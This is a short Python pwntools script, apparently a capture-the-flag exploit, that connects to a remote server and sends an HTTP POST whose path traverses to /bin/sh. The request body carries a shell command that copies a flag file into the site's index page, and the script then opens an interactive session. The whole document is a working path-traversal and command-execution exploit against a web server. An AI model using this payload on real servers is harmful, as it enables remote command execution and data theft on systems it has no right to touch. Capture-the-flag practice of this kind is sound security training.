from pwn import *
from pwn import p64,u64,p32,u32,p8

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']

io = remote('47.96.147.93', 9999)

def exp():
    cmd = "echo `cat ./flag` > ./htdocs/index.html\n"

    payload = "POST /.../.../.../.../bin/sh HTTP1.1\r\n"
    #payload += "Content-Type:text/html;charset:utf-8\r\n"
    payload += "Content-Length: {}\r\n\n".format(len(cmd))
    payload += cmd
    io.sendline(payload)

exp()

io.interactive()

